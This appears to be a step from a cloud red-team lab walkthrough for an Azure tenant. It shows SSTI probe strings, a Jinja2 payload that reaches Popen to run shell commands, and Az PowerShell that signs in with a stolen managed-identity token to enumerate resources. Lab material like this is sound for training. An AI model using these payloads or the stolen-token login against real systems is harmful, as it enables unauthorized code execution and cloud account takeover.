## Objective 11 ***Part of - Kill Chain - 2***

```
- An application in the defcorphq tenant is vulnerable to SSTI. Find the application and compromise the app service.
- Check if the service principal for the managed identity of the compromised app service has any interesting permissions on other Azure resources.
```
- SSTI 
```
{{7*7}}
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
```

- Find the right index of Popen **whoami** and **env** command
```python
{% for x in ().__class__.__mro__[1].__subclasses__() %}
  {% if "Popen" in x.__name__ %}
    {{x('whoami',shell=True,stdout=-1).communicate()}}
 {% endif %}
{% endfor %}
```
- Use this token with Az PowerShell to find all accessible resources:
```powershell
$token = 'eyJ0e..'
Connect-AzAccount -AccessToken $token -AccountId 2e91a4fea0f2-46ee-8214-fa2ff6aa9abc
Get-AzResource
```